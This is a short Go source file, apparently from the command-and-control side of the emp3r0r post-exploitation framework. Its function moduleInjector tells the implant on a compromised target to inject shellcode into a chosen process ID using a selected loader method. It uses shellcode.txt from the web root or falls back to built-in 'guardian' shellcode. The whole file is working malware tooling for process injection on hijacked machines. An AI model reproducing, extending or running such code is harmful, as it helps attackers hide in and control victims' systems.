package cc

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/agent"
)

func moduleInjector() {
	// target
	target := CurrentTarget
	if target == nil {
		CliPrintError("Target not exist")
		return
	}

	// shellcode.txt
	pid := Options["pid"].Val
	if !agent.IsFileExist(WWWRoot + "shellcode.txt") {
		CliPrintWarning("%sshellcode.txt does not exist,"+
			" the agent will be using built-in guardian shellcode", WWWRoot)
	}
	// choose a shellcode loader
	method := Options["method"].Val
	cmd := fmt.Sprintf("!inject %s %s", method, pid)

	// tell agent to inject this shellcode
	err = SendCmd(cmd, target)
	if err != nil {
		CliPrintError("Could not send command to agent: %v", err)
		return
	}
	CliPrintInfo("Please wait...")
}
